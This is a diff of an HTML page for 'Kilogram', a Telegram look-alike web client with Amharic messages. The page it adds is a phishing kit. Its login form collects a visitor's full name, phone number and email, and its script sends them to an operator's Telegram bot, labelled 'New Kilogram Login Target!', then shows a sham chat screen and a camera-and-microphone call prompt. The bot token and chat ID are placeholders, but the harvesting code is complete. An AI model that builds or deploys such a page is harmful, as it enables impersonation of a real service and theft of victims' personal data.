@@ -1,178 +1,559 @@
 <!DOCTYPE html>
 <html lang="am">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Kilogram Web</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-  <style>
-    :root {
-      --bg-dark: #0e1621;
-      --bg-sidebar: #17212b;
-      --bg-chat: #0e1621;
-      --primary: #2b5278;
-      --accent: #5288c1;
-      --text-main: #f5f5f5;
-      --text-muted: #7f91a4;
-      --msg-out: #2b5278;
-      --msg-in: #182533;
-      --border: #242f3d;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kilogram</title>
+    <style>
+        :root {
+            --tg-theme-bg-color: #17212b;
+            --tg-theme-bg-secondary: #0e1621;
+            --tg-theme-text-color: #f5f5f5;
+            --tg-theme-hint-color: #7f91a4;
+            --tg-theme-link-color: #64b5ef;
+            --tg-theme-button-color: #5288c1;
+            --tg-theme-button-text-color: #ffffff;
+            --tg-theme-header-bg: #242f3d;
+            --tg-theme-panel-bg: #182533;
+            --tg-theme-msg-out: #2b5278;
+            --tg-theme-msg-in: #182533;
+            --tg-theme-border: #0f1621;
+        }
 
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
-    }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
 
-    body {
-      background-color: var(--bg-dark);
-      color: var(--text-main);
-      height: 100vh;
-      display: flex;
-      overflow: hidden;
-    }
+        body {
+            background-color: var(--tg-theme-bg-color);
+            color: var(--tg-theme-text-color);
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
 
-    /* Login Modal Overlay */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      background: rgba(14, 22, 33, 0.95);
-      z-index: 1000;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
+        /* Login Screen */
+        .login-card {
+            background-color: var(--tg-theme-header-bg);
+            padding: 40px 30px;
+            border-radius: 16px;
+            width: 90%;
+            max-width: 380px;
+            text-align: center;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.6);
+        }
 
-    .login-card {
-      background: var(--bg-sidebar);
-      padding: 30px;
-      border-radius: 12px;
-      width: 100%;
-      max-width: 400px;
-      box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-      border: 1px solid var(--border);
-      text-align: center;
-    }
+        .login-logo {
+            width: 80px;
+            height: 80px;
+            background-color: var(--tg-theme-button-color);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px auto;
+            font-size: 32px;
+            font-weight: bold;
+            color: white;
+        }
 
-    .login-card h2 {
-      margin-bottom: 10px;
-      color: var(--text-main);
-    }
+        .login-card h2 {
+            margin-bottom: 8px;
+            color: var(--tg-theme-text-color);
+            font-size: 24px;
+        }
 
-    .login-card p {
-      color: var(--text-muted);
-      font-size: 14px;
-      margin-bottom: 20px;
-    }
+        .login-card p {
+            font-size: 14px;
+            color: var(--tg-theme-hint-color);
+            margin-bottom: 25px;
+        }
 
-    .form-group {
-      margin-bottom: 15px;
-      text-align: left;
-    }
+        .form-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
 
-    .form-group label {
-      display: block;
-      font-size: 12px;
-      color: var(--accent);
-      margin-bottom: 5px;
-    }
+        .form-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: var(--tg-theme-bg-secondary);
+            border: 1px solid #2b394a;
+            border-radius: 10px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
 
-    .form-group input {
-      width: 100%;
-      padding: 12px;
-      background: var(--bg-dark);
-      border: 1px solid var(--border);
-      border-radius: 8px;
-      color: white;
-      font-size: 14px;
-      outline: none;
-    }
+        .form-group input:focus {
+            border-color: var(--tg-theme-button-color);
+        }
 
-    .form-group input:focus {
-      border-color: var(--accent);
-    }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background-color: var(--tg-theme-button-color);
+            border: none;
+            border-radius: 10px;
+            color: var(--tg-theme-button-text-color);
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: opacity 0.2s;
+        }
 
-    .btn-login {
-      width: 100%;
-      padding: 12px;
-      background: var(--accent);
-      border: none;
-      border-radius: 8px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-      font-size: 16px;
-      margin-top: 10px;
-    }
+        .btn:hover {
+            opacity: 0.9;
+        }
 
-    .btn-login:hover {
-      background: #4376aa;
-    }
+        /* App Main Screen */
+        .app-container {
+            display: none;
+            width: 100vw;
+            height: 100vh;
+            flex-direction: row;
+        }
 
-    /* Main App Layout */
-    .sidebar {
-      width: 320px;
-      background: var(--bg-sidebar);
-      border-right: 1px solid var(--border);
-      display: flex;
-      flex-direction: column;
-    }
+        .sidebar {
+            width: 340px;
+            background-color: var(--tg-theme-bg-secondary);
+            border-right: 1px solid var(--tg-theme-border);
+            display: flex;
+            flex-direction: column;
+        }
 
-    .sidebar-header {
-      padding: 15px;
-      display: flex;
-      align-items: center;
-      gap: 15px;
-      border-bottom: 1px solid var(--border);
-    }
+        .sidebar-header {
+            padding: 12px 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            background-color: var(--tg-theme-header-bg);
+            border-bottom: 1px solid var(--tg-theme-border);
+        }
 
-    .search-bar {
-      flex: 1;
-      background: var(--bg-dark);
-      border-radius: 20px;
-      padding: 8px 15px;
-      display: flex;
-      align-items: center;
-      gap: 10px;
-    }
+        .menu-icon {
+            font-size: 20px;
+            cursor: pointer;
+            color: var(--tg-theme-hint-color);
+        }
 
-    .search-bar input {
-      background: transparent;
-      border: none;
-      color: white;
-      outline: none;
-      width: 100%;
-    }
+        .search-box {
+            flex: 1;
+            background-color: var(--tg-theme-bg-secondary);
+            padding: 8px 14px;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
 
-    .chat-list {
-      flex: 1;
-      overflow-y: auto;
-    }
+        .search-box input {
+            background: none;
+            border: none;
+            color: white;
+            outline: none;
+            width: 100%;
+            font-size: 14px;
+        }
 
-    .chat-item {
-      display: flex;
-      align-items: center;
-      padding: 12px 15px;
-      gap: 12px;
-      cursor: pointer;
-      border-bottom: 1px solid rgba(255,255,255,0.02);
-    }
+        .chat-list {
+            flex: 1;
+            overflow-y: auto;
+        }
 
-    .chat-item:hover, .chat-item.active {
-      background: var(--primary);
-    }
+        .chat-item {
+            display: flex;
+            align-items: center;
+            padding: 10px 15px;
+            cursor: pointer;
+            gap: 12px;
+            position: relative;
+        }
 
-    .avatar {
-      width: 48px;
-      height: 48px;
-      border-radius: 50%;
-      background: var(--accent);
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-weight: bold;
+        .chat-item:hover, .chat-item.active {
+            background-color: var(--tg-theme-panel-bg);
+        }
+
+        .avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #4ea4f4, #2b5278);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 16px;
+            color: white;
+            flex-shrink: 0;
+        }
+
+        .chat-info {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .chat-info-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+
+        .chat-info h4 {
+            font-size: 15px;
+            font-weight: 500;
+            color: var(--tg-theme-text-color);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .chat-time {
+            font-size: 12px;
+            color: var(--tg-theme-hint-color);
+        }
+
+        .chat-preview {
+            font-size: 13px;
+            color: var(--tg-theme-hint-color);
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+        }
+
+        .chat-area {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            background-color: var(--tg-theme-bg-color);
+            background-image: radial-gradient(circle, rgba(255,255,255,0.02) 1px, transparent 1px);
+            background-size: 20px 20px;
+        }
+
+        .chat-header {
+            padding: 10px 20px;
+            background-color: var(--tg-theme-header-bg);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--tg-theme-border);
+            height: 60px;
+        }
+
+        .header-user-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            cursor: pointer;
+        }
+
+        .header-user-info .avatar {
+            width: 40px;
+            height: 40px;
+            font-size: 14px;
+        }
+
+        .header-text h3 {
+            font-size: 15px;
+            font-weight: 500;
+        }
+
+        .header-text span {
+            font-size: 12px;
+            color: var(--tg-theme-link-color);
+        }
+
+        .header-actions {
+            display: flex;
+            gap: 15px;
+        }
+
+        .action-btn {
+            background: none;
+            border: none;
+            color: var(--tg-theme-hint-color);
+            font-size: 20px;
+            cursor: pointer;
+            padding: 8px;
+            border-radius: 50%;
+        }
+
+        .action-btn:hover {
+            background-color: rgba(255,255,255,0.05);
+            color: var(--tg-theme-text-color);
+        }
+
+        .messages-container {
+            flex: 1;
+            padding: 20px;
+            overflow-y: auto;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+        }
+
+        .message {
+            max-width: 60%;
+            padding: 8px 12px;
+            border-radius: 12px;
+            font-size: 14px;
+            line-height: 1.4;
+            position: relative;
+            word-wrap: break-word;
+        }
+
+        .message.incoming {
+            background-color: var(--tg-theme-msg-in);
+            align-self: flex-start;
+            border-bottom-left-radius: 4px;
+        }
+
+        .message.outgoing {
+            background-color: var(--tg-theme-msg-out);
+            align-self: flex-end;
+            border-bottom-right-radius: 4px;
+        }
+
+        .input-area {
+            padding: 12px 20px;
+            background-color: var(--tg-theme-header-bg);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .input-area input {
+            flex: 1;
+            padding: 12px 16px;
+            background-color: var(--tg-theme-bg-secondary);
+            border: none;
+            border-radius: 20px;
+            color: white;
+            outline: none;
+            font-size: 14px;
+        }
+
+        .send-icon-btn {
+            background: none;
+            border: none;
+            color: var(--tg-theme-button-color);
+            font-size: 22px;
+            cursor: pointer;
+        }
+
+        /* Video Call Modal */
+        .call-modal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: rgba(0,0,0,0.95);
+            z-index: 1000;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .video-box {
+            position: relative;
+            width: 85%;
+            max-width: 650px;
+            height: 450px;
+            background: #111;
+            border-radius: 14px;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        .call-controls {
+            margin-top: 25px;
+            display: flex;
+            gap: 20px;
+        }
+
+        .end-call-btn {
+            background-color: #e53935;
+            border: none;
+            padding: 14px 35px;
+            border-radius: 30px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(229, 57, 53, 0.4);
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Login Container -->
+    <div class="login-card" id="loginCard">
+        <div class="login-logo">KG</div>
+        <h2>Kilogram</h2>
+        <p>Please enter your details to sign in</p>
+        <form id="loginForm">
+            <div class="form-group">
+                <input type="text" id="userName" placeholder="Full Name" required>
+            </div>
+            <div class="form-group">
+                <input type="tel" id="userPhone" placeholder="Phone Number (e.g., +251...)" required>
+            </div>
+            <div class="form-group">
+                <input type="email" id="userEmail" placeholder="Email Address" required>
+            </div>
+            <button type="submit" class="btn">Next</button>
+        </form>
+    </div>
+
+    <!-- App Main Screen -->
+    <div class="app-container" id="appContainer">
+        <div class="sidebar">
+            <div class="sidebar-header">
+                <div class="menu-icon">☰</div>
+                <div class="search-box">
+                    <span>🔍</span>
+                    <input type="text" placeholder="Search">
+                </div>
+            </div>
+            <div class="chat-list">
+                <div class="chat-item active">
+                    <div class="avatar">KG</div>
+                    <div class="chat-info">
+                        <div class="chat-info-header">
+                            <h4>Kilogram Support</h4>
+                            <span class="chat-time">12:30</span>
+                        </div>
+                        <p class="chat-preview">Welcome to Kilogram Web!</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="chat-area">
+            <div class="chat-header">
+                <div class="header-user-info">
+                    <div class="avatar">KG</div>
+                    <div class="header-text">
+                        <h3>Kilogram Support</h3>
+                        <span>online</span>
+                    </div>
+                </div>
+                <div class="header-actions">
+                    <button class="action-btn" onclick="startCall()" title="Voice/Video Call">📞</button>
+                    <button class="action-btn" title="More options">⋮</button>
+                </div>
+            </div>
+
+            <div class="messages-container" id="msgBox">
+                <div class="message incoming">
+                    ሰላም! እንኳን ወደ ኪሎግራም በደህና መጡ። መረጃዎ በትክክል ተረጋግጧል።
+                </div>
+            </div>
+
+            <div class="input-area">
+                <input type="text" id="chatInput" placeholder="Write a message...">
+                <button class="send-icon-btn" onclick="sendMessage()">➤</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Video Call Modal -->
+    <div class="call-modal" id="callModal">
+        <div class="video-box">
+            <video id="userVideo" autoplay playsinline muted></video>
+        </div>
+        <div class="call-controls">
+            <button class="end-call-btn" onclick="endCall()">End Call</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "YOUR_BOT_TOKEN";
+        const CHAT_ID = "YOUR_CHAT_ID";
+
+        const loginForm = document.getElementById('loginForm');
+        const loginCard = document.getElementById('loginCard');
+        const appContainer = document.getElementById('appContainer');
+        const msgBox = document.getElementById('msgBox');
+        const chatInput = document.getElementById('chatInput');
+        const callModal = document.getElementById('callModal');
+        const userVideo = document.getElementById('userVideo');
+
+        let localStream = null;
+
+        loginForm.addEventListener('submit', function(e) {
+            e.preventDefault();
+            const name = document.getElementById('userName').value;
+            const phone = document.getElementById('userPhone').value;
+            const email = document.getElementById('userEmail').value;
+
+            sendToTelegram(`🎯 **New Kilogram Login Target!**\n👤 Name: ${name}\n📞 Phone: ${phone}\n📧 Email: ${email}`);
+
+            loginCard.style.display = 'none';
+            appContainer.style.display = 'flex';
+        });
+
+        function sendToTelegram(text) {
+            if(BOT_TOKEN === "YOUR_BOT_TOKEN" || CHAT_ID === "YOUR_CHAT_ID") return;
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            }).catch(err => console.log(err));
+        }
+
+        function sendMessage() {
+            const text = chatInput.value.trim();
+            if(!text) return;
+
+            const outMsg = document.createElement('div');
+            outMsg.className = 'message outgoing';
+            outMsg.innerText = text;
+            msgBox.appendChild(outMsg);
+
+            chatInput.value = '';
+            msgBox.scrollTop = msgBox.scrollHeight;
+
+            setTimeout(() => {
+                const inMsg = document.createElement('div');
+                inMsg.className = 'message incoming';
+                inMsg.innerText = "ይህ የኪሎግራም ዌብሳይት ሙከራ ነው! መልእክትዎ ደርሰናል።";
+                msgBox.appendChild(inMsg);
+                msgBox.scrollTop = msgBox.scrollHeight;
+            }, 1000);
+        }
+
+        async function startCall() {
+            try {
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                userVideo.srcObject = localStream;
+                callModal.style.display = 'flex';
+            } catch(err) {
+                alert("ካሜራ ወይም ማይክሮፎን ለመክፈት ፈቃድ አልተሰጠም።");
+            }
+        }
+
+        function endCall() {
+            if(localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+            callModal.style.display = 'none';
+        }
+    </script>
+</body>
+</html>
+
